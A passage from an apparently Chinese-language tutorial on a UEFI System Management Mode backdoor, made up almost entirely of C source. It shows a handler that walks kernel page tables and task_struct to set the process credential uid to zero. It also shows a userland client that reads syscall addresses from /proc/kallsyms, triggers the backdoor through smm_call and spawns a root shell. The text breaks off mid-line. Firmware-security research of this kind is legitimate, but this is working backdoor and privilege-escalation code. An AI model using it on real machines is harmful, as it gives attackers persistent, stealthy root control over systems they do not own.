class="line">                        mov    0x4(%rax), %eax    ; get desired value from cred</span><br><span class="line">                        retq</span><br><span class="line">                */</span><br><span class="line">                if (memcmp((void *)(Addr + 0x00), &quot;\x65\x48\x8b\x04\x25&quot;, 5) ||</span><br><span class="line">                    memcmp((void *)(Addr + 0x09), &quot;\x48\x8b\x80&quot;, 3) ||</span><br><span class="line">                    memcmp((void *)(Addr + 0x10), &quot;\x8b\x40&quot;, 2))</span><br><span class="line">                &#123;</span><br><span class="line">                    DbgMsg(__FILE__, __LINE__, &quot;ERROR: Unexpected binary code\r\n&quot;);</span><br><span class="line">                    </span><br><span class="line">                    Status = EFI_INVALID_PARAMETER;</span><br><span class="line">                    goto _end;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 获取字段偏移</span><br><span class="line">                OffsetCredVal = *(unsigned char *)(Addr + 0x12);</span><br><span class="line">                OffsetTaskStruct = *(int *)(Addr + 0x05);</span><br><span class="line">                OffsetCred = *(int *)(Addr + 0x0c);                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                DbgMsg(</span><br><span class="line">                    __FILE__, __LINE__, </span><br><span class="line">                    &quot;task_struct offset: 0x%x, cred offset: 0x%x, cred value offset: 0x%x\r\n&quot;,</span><br><span class="line">                    OffsetTaskStruct, OffsetCred, OffsetCredVal</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(</span><br><span class="line">                    __FILE__, __LINE__, </span><br><span class="line">                    &quot;ERROR: Unable to resolve physical address for 0x%llx\r\n&quot;, Arg1</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                goto _end;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 获取GS段基址</span><br><span class="line">            GsBase = __readmsr(IA32_KERNEL_GS_BASE);            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            DbgMsg(__FILE__, __LINE__, &quot;GS base is 0x%llx\r\n&quot;, GsBase);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 检查GS基址是否指向用户模式</span><br><span class="line">            if ((GsBase &gt;&gt; 63) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, &quot;ERROR: Bad GS base\r\n&quot;);</span><br><span class="line">                </span><br><span class="line">                Status = EFI_INVALID_PARAMETER;</span><br><span class="line">                goto _end;</span><br><span class="line">            &#125;            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 获取GS基址的物理地址</span><br><span class="line">            if ((Status = VirtualToPhysical(GsBase, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)</span><br><span class="line">            &#123;                </span><br><span class="line">                UINT64 TaskStruct = *(UINT64 *)(Addr + OffsetTaskStruct);   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                DbgMsg(__FILE__, __LINE__, &quot;task_struct is at 0x%llx\r\n&quot;, TaskStruct);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 获取task_struct结构体的物理地址</span><br><span class="line">                if ((Status = VirtualToPhysical(TaskStruct, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)</span><br><span class="line">                &#123;</span><br><span class="line">                    UINT64 Cred = *(UINT64 *)(Addr + OffsetCred);   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    DbgMsg(__FILE__, __LINE__, &quot;cred is at 0x%llx\r\n&quot;, Cred);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    // 获取task_struct-&gt;cred结构体的物理地址</span><br><span class="line">                    if ((Status = VirtualToPhysical(Cred, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)</span><br><span class="line">                    &#123;</span><br><span class="line">                        int *CredVal = (int *)(Addr + OffsetCredVal);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        DbgMsg(</span><br><span class="line">                            __FILE__, __LINE__, </span><br><span class="line">                            &quot;Current cred value is %d (setting to 0)\r\n&quot;, *CredVal</span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        // 设置root权限</span><br><span class="line">                        *CredVal = 0;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else</span><br><span class="line">                    &#123;</span><br><span class="line">                        DbgMsg(</span><br><span class="line">                            __FILE__, __LINE__, </span><br><span class="line">                            &quot;ERROR: Unable to resolve physical address for 0x%llx\r\n&quot;, Cred</span><br><span class="line">                        );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    DbgMsg(</span><br><span class="line">                        __FILE__, __LINE__, </span><br><span class="line">                        &quot;ERROR: Unable to resolve physical address for 0x%llx\r\n&quot;, TaskStruct</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(</span><br><span class="line">                    __FILE__, __LINE__, </span><br><span class="line">                    &quot;ERROR: Unable to resolve physical address for 0x%llx\r\n&quot;, GsBase</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_end:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>根据英特尔手册实现虚拟地址到物理地址转换的IA-32长模式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">#define PFN_TO_PAGE(_val_) ((_val_) &lt;&lt; PAGE_SHIFT)</span><br><span class="line">#define PAGE_TO_PFN(_val_) ((_val_) &gt;&gt; PAGE_SHIFT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 从CR3寄存器值中获取MPL4的地址</span><br><span class="line">#define PML4_ADDRESS(_val_) ((_val_) &amp; 0xfffffffffffff000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 从虚拟地址获取PML4索引</span><br><span class="line">#define PML4_INDEX(_addr_) (((_addr_) &gt;&gt; 39) &amp; 0x1ff)</span><br><span class="line">#define PDPT_INDEX(_addr_) (((_addr_) &gt;&gt; 30) &amp; 0x1ff)</span><br><span class="line">#define PDE_INDEX(_addr_) (((_addr_) &gt;&gt; 21) &amp; 0x1ff)</span><br><span class="line">#define PTE_INDEX(_addr_) (((_addr_) &gt;&gt; 12) &amp; 0x1ff)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define PAGE_OFFSET_4K(_addr_) ((_addr_) &amp; 0xfff)</span><br><span class="line">#define PAGE_OFFSET_2M(_addr_) ((_addr_) &amp; 0x1fffff)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// PDPTE 和 PDE的 PS flag</span><br><span class="line">#define PDPTE_PDE_PS 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define INTERLOCKED_GET(_addr_) InterlockedCompareExchange64((UINT64 *)(_addr_), 0, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOLEAN Check_IA_32e(PCONTROL_REGS ControlRegs)</span><br><span class="line">&#123;</span><br><span class="line">    UINT64 Efer = __readmsr(IA32_EFER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        检查SMI执行时是否启用了IA-32长模式内存转换机制。</span><br><span class="line">    */</span><br><span class="line">    if (!(ControlRegs-&gt;Cr0 &amp; CR0_PG))</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, &quot;ERROR: CR0.PG is not set\r\n&quot;);</span><br><span class="line">        return FALSE;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (!(ControlRegs-&gt;Cr4 &amp; CR4_PAE))</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, &quot;ERROR: CR4.PAE is not set\r\n&quot;);</span><br><span class="line">        return FALSE;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (!(Efer &amp; IA32_EFER_LME))</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, &quot;ERROR: IA32_EFER.LME is not set\r\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">//--------------------------------------------------------------------------------------</span><br><span class="line">EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)</span><br><span class="line">&#123;</span><br><span class="line">    UINT64 PhysAddr = 0;</span><br><span class="line">    EFI_STATUS Status = EFI_INVALID_PARAMETER;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DbgMsg(__FILE__, __LINE__, __FUNCTION__&quot;(): CR3 is 0x%llx, VA is 0x%llx\r\n&quot;, Cr3, Addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 获取给定虚拟地址的PML4表入口点</span><br><span class="line">    PML4Entry.Uint64 = INTERLOCKED_GET(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DbgMsgMem(</span><br><span class="line">        __FILE__, __LINE__, &quot;PML4E is at 0x%llx[0x%llx]: 0x%llx\r\n&quot;, </span><br><span class="line">        PML4_ADDRESS(Cr3), PML4_INDEX(Addr), PML4Entry.Uint64</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 检查该入口点是否存在</span><br><span class="line">    if (PML4Entry.Bits.Present)</span><br><span class="line">    &#123;</span><br><span class="line">        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 获取给定虚拟地址的PDPTE</span><br><span class="line">        PDPTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + </span><br><span class="line">                                           PDPT_INDEX(Addr) * sizeof(UINT64));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        DbgMsg(</span><br><span class="line">            __FILE__, __LINE__, &quot;PDPTE is at 0x%llx[0x%llx]: 0x%llx\r\n&quot;, </span><br><span class="line">            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress),</span><br><span class="line">            PDPT_INDEX(Addr), PDPTEntry.Uint64</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        //  检查该入口点是否存在</span><br><span class="line">        if (PDPTEntry.Bits.Present)</span><br><span class="line">        &#123;</span><br><span class="line">            // 检查页大小flag</span><br><span class="line">            if ((PDPTEntry.Uint64 &amp; PDPTE_PDE_PS) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 获取小于1Gbyte页的给定虚拟地址的PDE</span><br><span class="line">                PDEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +</span><br><span class="line">                                                 PDE_INDEX(Addr) * sizeof(UINT64));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                DbgMsg(</span><br><span class="line">                    __FILE__, __LINE__, &quot;PDE is at 0x%llx[0x%llx]: 0x%llx\r\n&quot;, </span><br><span class="line">                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), </span><br><span class="line">                    PDEntry.Uint64</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                //  检查该入口点是否存在</span><br><span class="line">                if (PDEntry.Bits.Present)</span><br><span class="line">                &#123;</span><br><span class="line">                    //  检查页大小flag</span><br><span class="line">                    if ((PDEntry.Uint64 &amp; PDPTE_PDE_PS) == 0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        X64_PAGE_TABLE_ENTRY_4K PTEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        // 获取4KB页的给定虚拟地址的PDE</span><br><span class="line">                        PTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +</span><br><span class="line">                                                         PTE_INDEX(Addr) * sizeof(UINT64));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        DbgMsg(</span><br><span class="line">                            __FILE__, __LINE__, &quot;PTE is at 0x%llx[0x%llx]: 0x%llx\r\n&quot;, </span><br><span class="line">                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), </span><br><span class="line">                            PTEntry.Uint64</span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        //  检查该入口点是否存在</span><br><span class="line">                        if (PTEntry.Bits.Present)</span><br><span class="line">                        &#123;</span><br><span class="line">                            // 获取所需的物理地址</span><br><span class="line">                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +</span><br><span class="line">                                       PAGE_OFFSET_4K(Addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            Status = EFI_SUCCESS;</span><br><span class="line">                        &#125;</span><br><span class="line">                        else</span><br><span class="line">                        &#123;</span><br><span class="line">                            DbgMsg(</span><br><span class="line">                                __FILE__, __LINE__, </span><br><span class="line">                                &quot;ERROR: PTE for 0x%llx is not present\r\n&quot;, Addr</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else</span><br><span class="line">                    &#123;</span><br><span class="line">                        // 获取2MB页所需的物理地址</span><br><span class="line">                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +</span><br><span class="line">                                   PAGE_OFFSET_2M(Addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        Status = EFI_SUCCESS;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    DbgMsg(</span><br><span class="line">                        __FILE__, __LINE__, </span><br><span class="line">                        &quot;ERROR: PDE for 0x%llx is not present\r\n&quot;, Addr</span><br><span class="line">                    );</span><br><span class="line">                &#125;                     </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, &quot;ERROR: 1Gbyte page\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, &quot;ERROR: PDPTE for 0x%llx is not present\r\n&quot;, Addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, &quot;ERROR: PML4E for 0x%llx is not present\r\n&quot;, Addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, &quot;Physical address of 0x%llx is 0x%llx\r\n&quot;, Addr, PhysAddr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (Ret)</span><br><span class="line">        &#123;            </span><br><span class="line">            // 返回已解析的物理地址给调用者</span><br><span class="line">            *Ret = PhysAddr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>下面是更新后的客户端代码，它从<code>/proc/kallsyms</code>伪文件中获取所需的系统调用函数地址并使用<code>smm_call()</code>以提权命令number作为参数调用后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MAX_COMMAND_LEN 0x200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// backdoor command number</span><br><span class="line">#define BACKDOOR_PRIVESC 8 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 在汇编中实现的外部接口函数</span><br><span class="line">extern int smm_call(long code, unsigned long long arg1, unsigned long long arg2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int ret = 0;    </span><br><span class="line">    cpu_set_t mask;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(0, &amp;mask);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret = sched_setaffinity(0, sizeof(mask), &amp;mask);</span><br><span class="line">    if (ret != 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;sched_setaffinity() ERROR %d\n&quot;, errno);</span><br><span class="line">        return errno; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (argc &gt;= 2 &amp;&amp; !strcmp(argv[1], &quot;--privesc&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        if (argc &gt;= 3)</span><br><span class="line">        &#123;</span><br><span class="line">            int i = 0;            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            for (i = 2; i &lt; argc; i += 2)</span><br><span class="line">            &#123;</span><br><span class="line">                unsigned long long addr = 0;</span><br><span class="line">                char *func = argv[i + 1];</span><br><span class="line"> </span><br><span class="line">                // 解析通过cat+grep它自身传递给程序的系统调用地址</span><br><span class="line">                if ((addr = strtoull(argv[i], NULL, 16)) == 0 &amp;&amp; errno == EINVAL)</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;strtoull() ERROR %d\n&quot;, errno);</span><br><span class="line">                    return errno; </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if (addr == 0)</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;ERROR: Unable to resolve %s() address\n&quot;, func);</span><br><span class="line">                    return EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                printf(&quot;%s() address is 0x%llx...\n&quot;, func, addr);            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 调用目标系统调用代码，以确保它没有被内核替换掉</span><br><span class="line">                getuid();</span><br><span class="line">                getgid();</span><br><span class="line">                geteuid();            </span><br><span class="line">                getegid();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 请求后门将cred字段值设置为0</span><br><span class="line">                ret = smm_call(BACKDOOR_PRIVESC, addr, 0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if (ret != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;ERROR: Backdoor returns 0x%x\n&quot;, ret);</span><br><span class="line">                    return ret;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 检查root权限</span><br><span class="line">            if (getuid() == 0 &amp;&amp; geteuid() == 0 &amp;&amp;</span><br><span class="line">                getgid() == 0 &amp;&amp; getegid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;SUCCESS\n&quot;);</span><br><span class="line"> </span><br><span class="line">                // 运行命令行</span><br><span class="line">                execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</span><br><span class="line">            &#125; </span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;FAILS\n&quot;);</span><br><span class="line">                return EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;            </span><br><span class="line">            int i = 0, code = 0;</span><br><span class="line">            char command[MAX_COMMAND_LEN];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            /* </span><br><span class="line">                在/proc/kallsyms中找到所需的系统调用地址，</span><br><span class="line">                并通过命令行参数将它们传递给相同的程序。</span><br><span class="line">            */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            char *functions[] = &#123; &quot;sys_getuid&quot;, &quot;sys_geteuid&quot;, </span><br><span class="line">                                  &quot;sys_getgid&quot;, &quot;sys_getegid&quot;, NULL &#125;;                                              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            printf(&quot;Getting root...\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            sprintf(command, &quot;%s --privesc &quot;, argv[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            for (i = 0; functions[i]; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                char *func = functions[i];            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                sprintf(</span><br><span class="line">                    command + strlen(command), </span><br><span class="line">                    &quot;0x`cat /proc/kallsyms | grep &#x27;%s$&#x27; | awk &#x27;&#123;print $1&#125;&#x27;` %s &quot;, func, func</span><br><span class="line">                );                </span><br><span class="line">            &#125;    </span><br><span class="line">            </span><br><span class="line">            code = system(command);</span><br><span class="line">            if (code != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ERROR: Command \&quot;%s\&quot; 